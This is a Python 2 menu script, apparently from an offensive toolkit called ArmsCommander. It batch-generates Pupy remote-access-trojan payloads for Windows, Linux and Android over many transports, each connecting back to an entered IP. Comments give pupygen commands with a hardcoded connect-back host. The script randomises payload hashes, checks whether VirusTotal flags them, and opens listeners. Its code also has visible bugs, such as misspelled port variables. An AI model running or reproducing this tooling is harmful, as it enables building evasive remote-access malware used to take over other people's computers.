#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

os.system('cat /root/ArmsCommander/banners/TesterDisclaimer.txt')
    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
	# - exe_86, exe_x64  : generate PE exe for windows
# root@Cylon-Basestar:~/pupy/pupy# python /root/pupy/pupy/pupygen.py -f client -O windows -A x86 connect --host 52.53.180.45:443 -t ssl

# CRITICAL UPDATE 4/17
# NinjaSec changed his output formats accoridng to It doesn't work because of cffi_backend. I add linux one to ignore list and forget about windows pyd =
# https://github.com/n1nj4sec/pupy/commit/1fa9343210a16fea90f093f7a1439675715add73
# The new APril 17th format is:
#                   [-f {client, # so basically client = numbers one to eight
#                   py,pyinst,
#                   py_oneliner,
#                   ps1,
#                   ps1_oneliner,
#                   rubber_ducky}]

format_Dict = {
    # '1': 'exe_x86',
    # '2': 'exe_x64',
    # '3': 'dll_x86',
    # '4': 'dll_x64',
    # '5': 'lin_x86',
    # '6': 'lin_x64',
    # '7': 'so_x86',
    # '8': 'so_x64',
    '1': 'client',
    '2': 'py',
    '3': 'pyinst',
    # '4': 'py_oneliner', # We have to cancel/comment these out because they require a active connection to send a payload
    '5': 'ps1',
    # '6': 'ps1_oneliner',
    # '7': 'rubber_ducky',
    '8': 'apk'
}

# New syntax format Pupy Generator is...
# python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443

format_List = [
    '\n\t1 Client',
    '2 Standalone Python *.py format',
    '3 Python pyinstaller wrapper file',
    '4 One-Liner HTTP Download-to-Memory Payload',
    '5 ps1 Powershell script, injects a pupy dll into a current process',
    '6 ps1 Remote Download Powershell-to-Pupy script',
    '7 Rubber Ducky Script and Injection binary file',
    '8 Generate a Android-Compatible Pupy APK installer'
]
#

transport_Dict = {
    '1': 'obfs3',
    '2': 'udp',
    '3': 'http',
    '4': 'tcp_cleartext',
    '5': 'rsa',
    '6': 'ssl',
    '7': 'udp_cleartext',
    '8': 'scramblesuit',
    '9': 'ssl_rsa'
}
transport_List = [
    '\n\t1 obfs3',
    '2 udp',
    '3 http',
    '4 tcp_cleartext',
    '5 rsa',
    '6 ssl',
    '7 udp_cleartext',
    '8 scramblesuit',
    '9 ssl_rsa'
]

# New syntax format Pupy Generator is...
# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443

OS_Dict = {
    '1': 'windows',
    '2': 'linux',
    '3': 'android'
}

OS_List = [
    '\n\t#1. Windows Compatible Payload',
    '#2. Linux',
    '#3. Android'
]

Arch_Dict = {
    '1': 'x86',
    '2': 'x64'
}

Arch_List = [
    '\n\t#1. 32-bit',
    '#2. 64-bit'
]

def generate_tester_payloads():
# Architecture_Chosen = str(raw_input("Enter which system you want to test payloads for, 32 or 64 bit: "))
# Architecture_Value = Arch_Dict[Architecture_Chosen]
    host_Connectback = str(raw_input("Enter the IP address where the RAT will connect back to: "))



    # assigns all the file extension types
    for key in format_Dict:
        Format_Chosen = format_Dict[key]
        if format_Dict[key] == 'client':
            # this is a subdirectory for anything for Option #1 "client", they have a Windows, Linux, and Android option
            if OS_Dict[key] == 'windows':
                file_extension = 'exe'
            if OS_Dict[key] == "linux":
                file_extension = 'lin'
            if OS_Dict[key] == "android":
                file_extension = 'apk'
        if format_Dict[key] == 'py':
            file_extension = 'py'
        if format_Dict[key] == 'pyinst':
            file_extension = 'py'
        if format_Dict[key] == "ps1":
            file_extension = "ps1"
        if format_Dict[key] == "apk":
            file_extension = "apk"

        for key in OS_Dict:
            Operating_System = OS_Dict[key]
            for key in Arch_Dict:
                Architecture_Value = Arch_Dict[key]
                for key in transport_Dict:
                    Transport_Type = transport_Dict[key]
                    if Transport_Type == "obfs3":
                        host_Port = '10000'
                    if Transport_Type == "udp":
                        host_Port = '1111'
                    if Transport_Type == "http":
                        host_Port = '2222'
                    if Transport_Type == "tcp_cleartext":
                        host_Port = '3333'
                    if Transport_Type == "rsa":
                        host_Port = '4444'
                    if Transport_Type == "ssl":
                        host_Port = '443'
                    if Transport_Type == "udp_cleartext":
                        host_Post = '5555'
                    if Transport_Type == "scramblesuit":
                        host_Post = '7070'
                    if Transport_Type == "ssl_rsa":
                        host_Post = '8080'
                    # I found a bug in the main generator, where I forgot to add the Transport_Type tuple. That means everything in the release version was always generating SSL payloads
                    # but the main generator is the same as this, minus the for loops.
                    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
                        Format_Chosen, # 0
                        Operating_System, # 1
                        Architecture_Value, #2
                        Format_Chosen, #3
                        Operating_System, # 4
                        Architecture_Value, # 5
                        Transport_Type, # 6
                        file_extension, # 7
                        host_Connectback, # 8
                        host_Port, # 9
                        Transport_Type # 10

                    )
                    print colored(cmd_String,'red','on_white')
                    os.system(cmd_String)
def check_VT():
    # Runs VT-notify, checks the hashes and see if any are found
    # however, by default, both GENERATOR and TESTER randomizes the payload hash
    sample_directory = '/root/ArmsCommander/payloads/tester'
    cmd_String = "ruby /usr/share/veil-evasion/tools/vt-notify/vt-notify.rb -d %s" % sample_directory
    os.system(cmd_String)
    main()
    return
def windows_only_payloads():
    host_Connectback = str(raw_input("Enter the IP address where the RAT will connect back to: "))



    # assigns all the file extension types
    for key in format_Dict:
        Format_Chosen = format_Dict[key]
        if format_Dict[key] == 'client':
            # this is a subdirectory for anything for Option #1 "client", they have a Windows, Linux, and Android option
            if OS_Dict[key] == 'windows':
                file_extension = 'exe'
            if OS_Dict[key] == "linux":
                file_extension = 'lin'
            if OS_Dict[key] == "android":
                file_extension = 'apk'
        if format_Dict[key] == 'py':
            file_extension = 'py'
        if format_Dict[key] == 'pyinst':
            file_extension = 'py'
        if format_Dict[key] == "ps1":
            file_extension = "ps1"
        if format_Dict[key] == "apk":
            file_extension = "apk"

        Operating_System = 'windows'
        for key in Arch_Dict:
            Architecture_Value = Arch_Dict[key]
            for key in transport_Dict:
                Transport_Type = transport_Dict[key]
                if Transport_Type == "obfs3":
                    host_Port = '10000'
                if Transport_Type == "udp":
                    host_Port = '1111'
                if Transport_Type == "http":
                    host_Port = '2222'
                if Transport_Type == "tcp_cleartext":
                    host_Port = '3333'
                if Transport_Type == "rsa":
                    host_Port = '4444'
                if Transport_Type == "ssl":
                    host_Port = '443'
                if Transport_Type == "udp_cleartext":
                    host_Post = '5555'
                if Transport_Type == "scramblesuit":
                    host_Post = '7070'
                if Transport_Type == "ssl_rsa":
                    host_Post = '8080'
                # I found a bug in the main generator, where I forgot to add the Transport_Type tuple. That means everything in the release version was always generating SSL payloads
                # but the main generator is the same as this, minus the for loops.
                cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
                    Format_Chosen, # 0
                    Operating_System, # 1
                    Architecture_Value, #2
                    Format_Chosen, #3
                    Operating_System, # 4
                    Architecture_Value, # 5
                    Transport_Type, # 6
                    file_extension, # 7
                    host_Connectback, # 8
                    host_Port, # 9
                    Transport_Type # 10

                )
                print colored(cmd_String,'red','on_white')
                os.system(cmd_String)
    return

def tester_server():
    os.system('python /root/ArmsCommander/remoteexploits/TestAllListeners.py')
def main():
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Generate Tester Payloads',
        '#2. Check Tester Payloads against Virus Total (Hash comparison)',
        '#3. Navigate to your Tester Payload Directory',
        '#4. Make all Windows Compatible Payloads',
        '#5. Tester Server (Open a server hosting all available Pupy transport options)'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
    elif opt_Choice == "1":
        os.system('clear')
        generate_tester_payloads()
    elif opt_Choice == "2":
        os.system('clear')
        check_VT()
    elif opt_Choice == "3":
        os.system('clear')
        os.system('nautilus /root/ArmsCommander/payloads/tester/'),
    elif opt_Choice == "4":
        os.system('clear')
        windows_only_payloads()
    elif opt_Choice == "5":
        os.system('clear')
        tester_server()
    else:
        print 'You have entered a invalid option'
        main()

main()
